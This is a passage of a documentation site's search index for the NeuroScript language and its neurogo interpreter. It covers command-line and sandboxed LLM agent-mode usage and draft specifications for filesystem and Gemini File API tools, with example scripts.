&lt;Target&gt; [ProcedureArguments...]\n</code></pre></li> <li><code>&lt;Target&gt;</code>: Can be either:<ul> <li>The path to a <code>.ns.txt</code> file (e.g., <code>./library/examples/example.ns.txt</code>). <code>neurogo</code> will execute the first procedure defined in that file.</li> <li>The name of a specific procedure (e.g., <code>TestListAndMapAccess</code>). <code>neurogo</code> will search for this procedure in files within the library path(s).</li> </ul> </li> <li><code>[ProcedureArguments...]</code>: Any arguments to pass to the NeuroScript procedure being run, provided as separate strings.</li> <li>Common Flags:<ul> <li><code>-lib &lt;path&gt;</code>: Specifies a directory containing <code>.ns.txt</code> files to be treated as a library. Can be used multiple times. Procedures in library files can be called by <code>&lt;Target&gt;</code> name. Example: <code>-lib ./library</code>.</li> <li><code>-debug-ast</code>: Prints the Abstract Syntax Tree after parsing the script.</li> <li><code>-debug-interpreter</code>: Enables verbose logging of the interpreter's execution steps.</li> </ul> </li> <li>Examples: <pre><code># Run the first procedure in examples/example.ns.txt, using ./library for CALLs\n./neurogo -lib ./library ./library/examples/example.ns.txt\n\n# Run the specific procedure 'AskCapitalCity' found in the library, with debug output\n./neurogo -debug-interpreter -lib ./library AskCapitalCity \"France\"\n\n# Run a procedure from a specific file, passing arguments\n./neurogo -lib ./library ./library/test_listmap.ns.txt TestListAndMapAccess \"MyPrefix\" \"Arg2Value\"\n</code></pre></li> </ul>"},{"location":"front/installation/#5-running-neurogo-agent-mode-experimental","title":"5. Running <code>neurogo</code> (Agent Mode - Experimental)","text":"<p>This mode allows <code>neurogo</code> to act as a secure backend for an LLM.</p> <ul> <li>Basic Syntax: <pre><code>./neurogo -agent [security_flags...] [other_flags...]\n</code></pre></li> <li>Required Security Flags:<ul> <li><code>-agent</code>: Enables agent mode.</li> <li><code>-allowlist &lt;file&gt;</code>: Path to a text file listing <code>TOOL.FunctionName</code>s the LLM is allowed to call (one per line).</li> <li><code>-sandbox &lt;dir&gt;</code>: Path to a directory that acts as the root for all filesystem operations requested by the LLM via tools. Crucial for security.</li> </ul> </li> <li>Optional Security Flags:<ul> <li><code>-denylist &lt;file&gt;</code>: Path to a text file listing <code>TOOL.FunctionName</code>s the LLM is explicitly forbidden from calling (overrides allowlist). Recommended for disabling dangerous tools like <code>TOOL.ExecuteCommand</code>.</li> </ul> </li> <li>Other Agent Flags:<ul> <li><code>-model &lt;model_name&gt;</code>: Specify which Gemini model to use (e.g., <code>models/gemini-1.5-flash-latest</code>).</li> <li><code>-apikey &lt;key&gt;</code>: Provide API key via flag (alternative to environment variable).</li> </ul> </li> <li>Example: <pre><code># Start agent mode, requiring GEMINI_API_KEY env var\n# Allow tools listed in agent_allowlist.txt\n# Confine file operations to ./agent_sandbox directory\n./neurogo -agent \\\n    -allowlist ./cmd/neurogo/agent_allowlist.txt \\\n    -sandbox ./cmd/neurogo/agent_sandbox \\\n    -denylist ./cmd/neurogo/agent_denylist.txt # Optional: Explicitly deny certain tools\n</code></pre></li> </ul>"},{"location":"front/installation/#6-optional-setup-vector-database","title":"6. Optional Setup (Vector Database)","text":"<ul> <li>The tools related to finding NeuroScript skills (<code>TOOL.SearchSkills</code>, <code>TOOL.VectorUpdate</code>) currently use a simple in-memory mock implementation.</li> <li>No external vector database setup is required to use the current version of <code>neurogo</code>. A real implementation is planned for the future.</li> </ul>"},{"location":"front/why-ns/","title":"Why NeuroScript","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: why-neuroscript-v0.1 :: status: draft :: dependsOn: docs/front/architecture.md, docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review against the project's evolving goals and capabilities. Ensure links remain valid.  </p>"},{"location":"front/why-ns/#why-neuroscript","title":"Why NeuroScript?","text":"<p>\"A mile wide and an inch deep\": NS contains many formats, all are simple, not concise, not optimized. This is by design -- everything should be as obvious and self-explanatory as possible.</p> <p>NeuroScript exists to enable more effective collaboration in increasingly complex systems involving people, AI models, and traditional software components. Here's why it's a valuable approach:</p> <ol> <li> <p>Build More Robust Hybrid Systems: By providing clear, structured communication channels (Core Components in architecture.md), NeuroScript reduces ambiguity and errors inherent in purely natural language instructions or overly complex code interfaces. This clarity simplifies the design and implementation of sophisticated systems where AI, code, and humans must work together reliably.</p> </li> <li> <p>Enable Effective Specialization: Leverage the unique strengths of each participant. Let computers handle repetitive, mechanical tasks at high speed using deterministic <code>TOOL.*</code> functions (see Key Features in concepts.md). Allow AI agents (<code>CALL LLM</code>) to perform complex pattern recognition, generation, and inferential work. Keep humans in the loop for direction, review, and tasks requiring nuanced judgment (see Agent Mode in concepts.md). NeuroScript acts as the orchestrator.</p> </li> <li> <p>Allow Clear Oversight &amp; Auditing: All NeuroScript procedures (<code>.ns.txt</code>) and data formats (<code>.nd*</code>) are plain text, designed explicitly for readability by all parties (Principle #1 in concepts.md). This transparency makes it easier to understand, debug, review, and audit the behavior of complex workflows, unlike opaque model internals or complex compiled code.</p> </li> <li> <p>Improve Efficiency (Compute &amp; Energy): Procedural knowledge captured in NeuroScript allows simpler or less computationally intensive AI models (or even non-AI components) to perform tasks that might otherwise require a larger, more energy-hungry model. By encoding reusable \"skills\" and leveraging specialized tools, systems can potentially achieve complex results more efficiently (see Agent Facilities Design).</p> </li> <li> <p>Increase Reliability &amp; Repeatability: Explicit procedural knowledge in <code>.ns.txt</code> files (Language Specification in ../script spec.md) ensures tasks are performed consistently. Standardized NeuroData formats (NeuroData Overview in ../neurodata_and_composite_file_spec.md) ensure data is represented uniformly, reducing errors caused by inconsistent inputs or outputs between different system components.</p> </li> </ol>"},{"location":"ns/tools/","title":"Index","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.5 :: id: tool-spec-index-v0.1.5 :: status: draft :: dependsOn: ./*.md :: howToUpdate: Update the list below when tool specification documents are added, removed, or renamed in this directory.  </p>"},{"location":"ns/tools/#neuroscript-tool-specifications-index","title":"NeuroScript Tool Specifications Index","text":"<p>This directory contains detailed specifications for the built-in functions (grouped by category like <code>FS</code>, <code>git</code>, <code>String</code>, etc.) available within the NeuroScript language. Each specification follows a standard format to ensure clarity and consistency.</p>"},{"location":"ns/tools/#specification-format","title":"Specification Format","text":"<ul> <li>Tool Specification Structure Template: Defines the standard structure used for all tool specification documents in this directory.</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-core-tools","title":"Available Tool Specifications (Core Tools)","text":""},{"location":"ns/tools/#filesystem-tools-fs","title":"Filesystem Tools (<code>FS.*</code>)","text":"<ul> <li>FS.ReadFile: Reads the entire content of a specific file.</li> <li>FS.WriteFile: Writes content to a specific file, overwriting if exists.</li> <li>FS.ListDirectory: Lists the contents (files and subdirectories) of a directory.</li> <li>FS.Mkdir: Creates a new directory (including any necessary parents).</li> <li>FS.LineCountFile: Counts lines in a specified file.</li> <li>FS.SanitizeFilename: Cleans a string for use as a filename.</li> <li>FS.WalkDir: Recursively walks a directory tree, listing files/subdirs found.</li> <li>FS.FileHash: Calculates the SHA256 hash of a file.</li> <li>FS.MoveFile: Moves or renames a file or directory. (Previously <code>TOOL.MoveFile</code>)</li> <li>FS.DeleteFile: Deletes a file or an empty directory.</li> </ul>"},{"location":"ns/tools/#vector-tools-vector","title":"Vector Tools (<code>Vector.*</code>)","text":"<ul> <li>Vector.SearchSkills: Searches the (mock) vector index for skills matching a query.</li> <li>Vector.VectorUpdate: Updates the (mock) vector index for a given file.</li> </ul>"},{"location":"ns/tools/#git-tools-git","title":"Git Tools (<code>git.*</code>)","text":"<ul> <li>git.Add: Stages changes for commit (<code>git add</code>).</li> <li>git.Commit: Commits staged changes (<code>git commit -m</code>).</li> <li>git.NewBranch: Creates and checks out a new branch (<code>git checkout -b</code>).</li> <li>git.Checkout: Checks out an existing branch or commit (<code>git checkout</code>).</li> <li>git.Rm: Removes a file from the Git index (<code>git rm</code>).</li> <li>git.Merge: Merges a branch into the current branch (<code>git merge</code>).</li> <li>git.Status: Gets the current Git repository status. (Previously <code>TOOL.GitStatus</code>)</li> <li>git.Pull: Fetches and integrates changes from a remote repository (<code>git pull</code>). (Previously <code>TOOL.GitPull</code>)</li> <li>git.Push: Pushes local commits to a remote repository (<code>git push</code>). (Previously <code>TOOL.GitPush</code>)</li> <li>git.Diff: Shows unstaged changes in the working directory (<code>git diff</code>). (Previously <code>TOOL.GitDiff</code>)</li> </ul>"},{"location":"ns/tools/#string-tools-string","title":"String Tools (<code>String.*</code>)","text":"<ul> <li>String Tools Summary: Overview of all string manipulation tools (<code>StringLength</code>, <code>Substring</code>, <code>ToUpper</code>, <code>ToLower</code>, <code>TrimSpace</code>, <code>SplitString</code>, <code>SplitWords</code>, <code>JoinStrings</code>, <code>ReplaceAll</code>, <code>Contains</code>, <code>HasPrefix</code>, <code>HasSuffix</code>, <code>LineCountString</code>).</li> </ul>"},{"location":"ns/tools/#shell-tools-shell","title":"Shell Tools (<code>Shell.*</code>)","text":"<ul> <li>Shell.ExecuteCommand: Executes an arbitrary external command. (Use with extreme caution!)</li> <li>(GoBuild, GoCheck, GoTest, GoFmt, GoModTidy specs needed)</li> </ul>"},{"location":"ns/tools/#math-tools-math","title":"Math Tools (<code>Math.*</code>)","text":"<ul> <li>(Add, Subtract, etc. specs needed)</li> </ul>"},{"location":"ns/tools/#metadata-tools-metadata","title":"Metadata Tools (<code>Metadata.*</code>)","text":"<ul> <li>(GetMetadata, SetMetadata specs needed)</li> </ul>"},{"location":"ns/tools/#list-tools-list","title":"List Tools (<code>List.*</code>)","text":"<ul> <li>(ListLength, GetElement, AppendToList, etc. specs needed)</li> </ul>"},{"location":"ns/tools/#go-ast-tools-goast","title":"Go AST Tools (<code>GoAST.*</code>)","text":"<ul> <li>GoAST.UpdateImportsForMovedPackage: Updates Go import paths after refactoring. (Previously <code>TOOL.GoUpdateImports...</code>)</li> <li>(GoParseFile, GoFindIdentifiers, etc. specs needed)</li> </ul>"},{"location":"ns/tools/#io-tools-io","title":"IO Tools (<code>IO.*</code>)","text":"<ul> <li>(Log, Input specs needed)</li> </ul>"},{"location":"ns/tools/#llm-tools-llm","title":"LLM Tools (<code>LLM.*</code>)","text":"<ul> <li>(Call specs needed)</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-file-api-tools-external","title":"Available Tool Specifications (File API Tools - External)","text":"<p>These tools interact with the Gemini File API and may not be considered core language tools in the same way as the above.</p> <ul> <li>FileAPI.ListAPIFiles: Lists files stored in the Gemini File API. (Previously <code>TOOL.ListAPIFiles</code>)</li> <li>FileAPI.DeleteAPIFile: Deletes a file from the Gemini File API. (Previously <code>TOOL.DeleteAPIFile</code>)</li> <li>FileAPI.UploadFile: Uploads a local file to the Gemini File API. (Previously <code>TOOL.UploadFile</code>)</li> <li>FileAPI.SyncFiles: Synchronizes files between local and API storage. (Previously <code>TOOL.SyncFiles</code>)</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-neurodata-tools-external","title":"Available Tool Specifications (NeuroData Tools - External)","text":"<ul> <li>NeuroData.QueryTable: Queries NeuroData Table (<code>.ndtable</code>) files. (Previously <code>TOOL.QueryTable</code>)</li> </ul> <p>(This list should be updated as more tool specifications are created or existing ones are updated.)</p>"},{"location":"ns/tools/delete_api_file/","title":"delete_api_file","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-delete-api-file-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if argument validation or return value changes.</p> <p># Tool Specification: TOOL.DeleteAPIFile (v0.1)</p> <ul> <li>Tool Name: TOOL.DeleteAPIFile (v0.1)</li> <li>Purpose: Permanently deletes a specific file from the Gemini File API storage using its unique API resource name.</li> <li>NeuroScript Syntax: <pre><code>deleteResult := TOOL.DeleteAPIFile(apiFileName)\n</code></pre></li> <li>Arguments:<ul> <li><code>api_file_name</code> (String): Required. The unique resource name of the file to delete, typically starting with \"files/\" (e.g., \"files/abc123xyz\").</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A confirmation string (e.g., \"Successfully deleted API file: files/abc123xyz\").</li> <li>On failure: An error string describing the failure (e.g., \"Failed to delete API file 'files/...' : rpc error: code = NotFound desc = File not found\"). A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Validates that the <code>api_file_name</code> argument is a non-empty string.</li> <li>Calls the Gemini File API's <code>DeleteFile</code> endpoint with the provided <code>api_file_name</code>.</li> <li>If the API call succeeds, returns a success message string.</li> <li>If the API call fails (e.g., file not found, permission denied), returns an error message string and propagates the Go error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permission to delete files.</li> <li>Deletion is permanent and cannot be undone.</li> <li>Network access to Google Cloud services is required.</li> </ul> </li> <li>Examples: <pre><code>// Assume apiNameToDelete holds \"files/some-generated-id\"\napiNameToDelete := \"files/abc123xyz\"\nresult := TOOL.DeleteAPIFile(apiNameToDelete)\nIO.Print(\"Deletion Result:\", result)\n\n// Example: Delete all files listed by ListAPIFiles\nallFiles := TOOL.ListAPIFiles()\nFOR fileInfo IN allFiles DO\n    IF fileInfo[\"error\"] == null AND fileInfo[\"name\"] != null THEN\n        IO.Print(\"Attempting to delete:\", fileInfo[\"name\"])\n        deleteMsg := TOOL.DeleteAPIFile(fileInfo[\"name\"])\n        IO.Print(\"  Result:\", deleteMsg)\n    END\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolDeleteAPIFile</code>.</li> <li>Uses <code>interpreter.GenAIClient().DeleteFile()</code>.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_deletefile/","title":"fs_deletefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-deletefile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_delete.go, docs/script_spec.md :: relatedTo: FS.MoveFile, FS.WriteFile, FS.Mkdir :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_deletefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_deletefile/#tool-specification-fsdeletefile-v01","title":"Tool Specification: <code>FS.DeleteFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.DeleteFile</code> (v0.1)</li> <li>Purpose: Deletes a specified file or an empty directory within the sandbox. It does not delete non-empty directories.</li> <li>NeuroScript Syntax: <code>CALL FS.DeleteFile(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path (within the sandbox) of the file or empty directory to be deleted.</li> </ul> </li> <li>Return Value: (String)<ul> <li>Returns the literal string <code>\"OK\"</code> if: (Accessible via <code>LAST</code> after the <code>CALL</code>)<ul> <li>The file or empty directory was successfully deleted.</li> <li>The specified path did not exist (considered idempotent success).</li> </ul> </li> <li>Returns an error message string if: (Accessible via <code>LAST</code> after the <code>CALL</code>)<ul> <li>Path validation fails.</li> <li>The path refers to a non-empty directory.</li> <li>A permission error or other OS-level error occurs during deletion.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>path</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Attempts to delete the file or directory at the validated absolute path using <code>os.Remove</code>.</li> <li>If <code>os.Remove</code> returns an error:<ul> <li>Checks if the error indicates the path does not exist (<code>os.ErrNotExist</code>). If so, returns <code>\"OK\"</code>.</li> <li>Checks if the error message indicates the directory is not empty (using string checks for common OS messages). If so, returns an error message string detailing this.</li> <li>For any other error (e.g., permissions), returns an error message string containing the OS error details.</li> </ul> </li> <li>If <code>os.Remove</code> succeeds without error, returns <code>\"OK\"</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot delete files or directories outside the sandbox.</li> <li>Performs filesystem modification (deletion). Deletions are generally permanent.</li> <li>Explicitly prevents deletion of non-empty directories, adding a layer of safety against accidental recursive deletion.</li> <li>Relies on the underlying operating system's permissions for deletion capabilities.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create and delete a file\nCALL FS.WriteFile(\"temp_file_to_delete.txt\", \"Delete me\")\nSET write_ok = LAST\n\nCALL FS.DeleteFile(\"temp_file_to_delete.txt\")\nSET delete_status = LAST\n\nIF delete_status == \"OK\" THEN\n    EMIT \"Successfully deleted temp_file_to_delete.txt\"\nELSE\n    EMIT \"Error deleting file: \" + delete_status\nENDBLOCK\n\n# Example 2: Attempt to delete a non-existent file (should return OK)\nCALL FS.DeleteFile(\"this_does_not_exist.tmp\")\nSET non_exist_status = LAST\nEMIT \"Status for deleting non-existent file: \" + non_exist_status # Expect \"OK\"\n\n# Example 3: Create a directory, add a file, try to delete (will fail)\nCALL FS.Mkdir(\"dir_to_delete\")\nCALL FS.WriteFile(\"dir_to_delete/cannot_delete_me.txt\", \"I prevent deletion\")\n\nEMIT \"Attempting to delete non-empty directory...\"\nCALL FS.DeleteFile(\"dir_to_delete\")\nSET non_empty_delete_status = LAST\nIF non_empty_delete_status != \"OK\" THEN\n    EMIT \"Deletion failed as expected: \" + non_empty_delete_status\n    # Expected error message like: Failed to delete 'dir_to_delete': ...directory not empty...\nELSE\n    EMIT \"Deletion unexpectedly succeeded for non-empty directory.\"\nENDBLOCK\n\n# Example 4: Delete the file inside, then delete the now-empty directory\nCALL FS.DeleteFile(\"dir_to_delete/cannot_delete_me.txt\")\nSET delete_inner_status = LAST\nEMIT \"Deleted inner file status: \" + delete_inner_status\n\nCALL FS.DeleteFile(\"dir_to_delete\")\nSET empty_dir_delete_status = LAST\nEMIT \"Status for deleting empty directory: \" + empty_dir_delete_status # Expect \"OK\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_delete.go</code></li> <li>Function: <code>toolDeleteFile</code></li> <li>Spec Name: <code>DeleteFile</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>errors</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsDeleteTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code>. Handles <code>ErrNotExist</code> as success (\"OK\") and checks for directory-not-empty errors specifically.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_filehash/","title":"fs_filehash","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-filehash-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_hash.go, docs/script_spec.md :: relatedTo: FS.ReadFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_filehash/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_filehash/#tool-specification-fsfilehash-v01","title":"Tool Specification: <code>FS.FileHash</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.FileHash</code> (v0.1)</li> <li>Purpose: Calculates the SHA256 hash of a specified file within the sandbox and returns it as a hex-encoded string. Useful for verifying file integrity or detecting changes.</li> <li>NeuroScript Syntax: <code>CALL FS.FileHash(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path (within the sandbox) of the file to hash.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string containing the lowercase hex-encoded SHA256 hash of the file's content. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error (e.g., path validation fails, file not found, path is a directory, read error): Returns an empty string (<code>\"\"</code>). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. Returns <code>\"\"</code> if validation fails.</li> <li>Attempts to open the file at the validated absolute path. Returns <code>\"\"</code> if opening fails (e.g., file not found, permission denied).</li> <li>Checks if the opened path refers to a directory. If it is a directory, returns <code>\"\"</code>.</li> <li>Initializes a new SHA256 hasher.</li> <li>Reads the entire file content and feeds it into the hasher using <code>io.Copy</code>. Returns <code>\"\"</code> if there's an error during reading.</li> <li>Computes the final SHA256 hash digest.</li> <li>Formats the hash digest as a lowercase hexadecimal string.</li> <li>Returns the resulting hex string.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot access files outside the sandbox.</li> <li>Reads the entire file content into memory implicitly during the <code>io.Copy</code> operation for hashing. Very large files could consume significant memory and processing time.</li> <li>Does not modify the file system.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Hash a known file\nCALL FS.WriteFile(\"data.txt\", \"This is a test file.\") # Create file\nSET write_ok = LAST\n\nCALL FS.FileHash(\"data.txt\")\nSET file_hash = LAST\n\nIF file_hash == \"\" THEN\n  EMIT \"Error calculating hash for data.txt\"\nELSE\n  EMIT \"SHA256 Hash of data.txt: \" + file_hash\n  # Expected hash for \"This is a test file.\" is typically:\n  # c7be1ed902fb8dd4d48997c6452f5d7e509fbcdbe2808b16bcf4edce4c07d14e\nENDBLOCK\n\n# Example 2: Hash a non-existent file\nCALL FS.FileHash(\"no_file_here.dat\")\nSET missing_hash = LAST\nEMIT \"Hash result for non-existent file: '\" + missing_hash + \"'\" # Expect \"\"\n\n# Example 3: Attempt to hash a directory\nCALL FS.Mkdir(\"temp_dir\")\nSET mkdir_ok = LAST\nCALL FS.FileHash(\"temp_dir\")\nSET dir_hash = LAST\nEMIT \"Hash result for directory: '\" + dir_hash + \"'\" # Expect \"\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_hash.go</code></li> <li>Function: <code>toolFileHash</code></li> <li>Spec Name: <code>FileHash</code></li> <li>Key Go Packages: <code>crypto/sha256</code>, <code>fmt</code>, <code>io</code>, <code>os</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsHashTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code> internally, but handles errors to return the hash or <code>\"\"</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_linecountfile/","title":"fs_linecountfile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-linecountfile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.ReadFile, FS.ListDirectory :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_linecountfile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_linecountfile/#tool-specification-fslinecountfile-v01","title":"Tool Specification: <code>FS.LineCountFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.LineCountFile</code> (v0.1)</li> <li>Purpose: Counts the number of lines in a specified text file within the sandbox.</li> <li>NeuroScript Syntax: <code>CALL FS.LineCountFile(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path to the file within the sandbox whose lines should be counted.</li> </ul> </li> <li>Return Value: (Number)<ul> <li>On success: An integer representing the number of lines in the file. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>An empty file returns <code>0</code>.</li> <li>Lines are typically delimited by the newline character (<code>\\n</code>).</li> <li>If the file has content but does not end with a newline, the last line is still counted.</li> <li>A file containing only a single newline character returns <code>1</code>.</li> </ul> </li> <li>On error (e.g., file not found, path validation fails, read error): Returns the integer <code>-1</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. If validation fails, returns <code>-1</code>.</li> <li>Attempts to read the entire content of the specified file using the validated absolute path (<code>os.ReadFile</code>).</li> <li>If reading the file fails (e.g., not found, permission denied), returns <code>-1</code>.</li> <li>If the file content is empty, returns <code>0</code>.</li> <li>Counts the occurrences of the newline character (<code>\\n</code>) in the content.</li> <li>If the content is not empty and does not end with a newline character, increments the count by 1.</li> <li>Handles the edge case where the file content is exactly <code>\\n</code>, setting the count to <code>1</code>.</li> <li>Returns the final calculated line count as an integer (Number).</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot access files outside the sandbox.</li> <li>Reads file content into memory to perform the count. Very large files could potentially consume significant memory during processing, although the counting itself is generally efficient.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Count lines in a log file\nCALL FS.WriteFile(\"activity.log\", \"User logged in.\\nPerformed action A.\\nUser logged out.\") # Create a 3-line file\nSET write_ok = LAST\n\nCALL FS.LineCountFile(\"activity.log\")\nSET line_count = LAST\n\nIF line_count &gt;= 0 THEN\n    EMIT \"Log file 'activity.log' has \" + line_count + \" lines.\" # Expect 3\nELSE\n    EMIT \"Error counting lines in 'activity.log'.\"\nENDBLOCK\n\n# Example 2: Count lines in a non-existent file\nCALL FS.LineCountFile(\"non_existent_file.txt\")\nSET count_error = LAST\nEMIT \"Line count for non-existent file: \" + count_error # Expect -1\n\n# Example 3: Count lines in an empty file\nCALL FS.WriteFile(\"empty.txt\", \"\")\nSET empty_write_ok = LAST\nCALL FS.LineCountFile(\"empty.txt\")\nSET empty_count = LAST\nEMIT \"Line count for empty file: \" + empty_count # Expect 0\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_utils.go</code></li> <li>Function: <code>toolLineCountFile</code></li> <li>Spec Name: <code>LineCountFile</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsUtilTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>int64, error</code> internally, but handles errors to return the count or -1.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_mkdir/","title":"fs_mkdir","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-mkdir-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_dirs.go, docs/script_spec.md :: relatedTo: FS.ListDirectory, FS.WriteFile, FS.DeletePath :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_mkdir/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_mkdir/#tool-specification-fsmkdir-v01","title":"Tool Specification: <code>FS.Mkdir</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.Mkdir</code> (v0.1)</li> <li>Purpose: Creates a new directory, including any necessary parent directories that do not exist, within the designated sandbox.</li> <li>NeuroScript Syntax: <code>CALL FS.Mkdir(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path within the sandbox of the directory to create. Intermediate parent directories will be created as needed.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A status message string indicating success (e.g., \"Successfully created directory: logs/today\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure (e.g., \"Mkdir path security error...\", \"Failed to create directory...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided.</li> <li>Validates the <code>path</code> argument is not an empty string.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Determines the parent directory of the requested <code>path</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the parent directory against the <code>sandboxDir</code>. If the parent directory path is invalid or outside the sandbox, returns an error message string.</li> <li>Constructs the full absolute path of the target directory to be created based on the validated parent directory and the final component of the input <code>path</code>.</li> <li>Performs an additional security check to ensure the final absolute path to create does not escape the validated sandbox path (using <code>filepath.Clean</code> and prefix checks). If it escapes, returns an error message string.</li> <li>If all security checks pass, attempts to create the directory (and any necessary parents) using <code>os.MkdirAll</code> with default permissions (0755).</li> <li>If <code>os.MkdirAll</code> fails (e.g., permission denied, path element exists but is not a directory), returns an error message string.</li> <li>If directory creation is successful, returns a success message string including the original relative path.</li> </ol> </li> <li>Security Considerations:<ul> <li>Confined to the interpreter's sandbox directory via <code>SecureFilePath</code> validation on the parent path and explicit checks on the final path.</li> <li>Creates directories with permissions mode 0755 (before umask).</li> <li>Can create multiple directory levels if they don't exist within the sandbox.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create a simple directory\nCALL FS.Mkdir(\"output_data\")\nSET mkdir_status = LAST\nEMIT \"Mkdir status for 'output_data': \" + mkdir_status\n\n# Example 2: Create nested directories\nCALL FS.Mkdir(\"project_files/src/components\")\nSET nested_status = LAST\nIF String.Contains(nested_status, \"Successfully created\") THEN\n    EMIT \"Nested directories created successfully.\"\n    # Now we can safely write a file there\n    CALL FS.WriteFile(\"project_files/src/components/button.js\", \"// Button component code\")\n    SET write_status = LAST\n    EMIT \"File write status: \" + write_status\nELSE\n    EMIT \"Failed to create nested directories: \" + 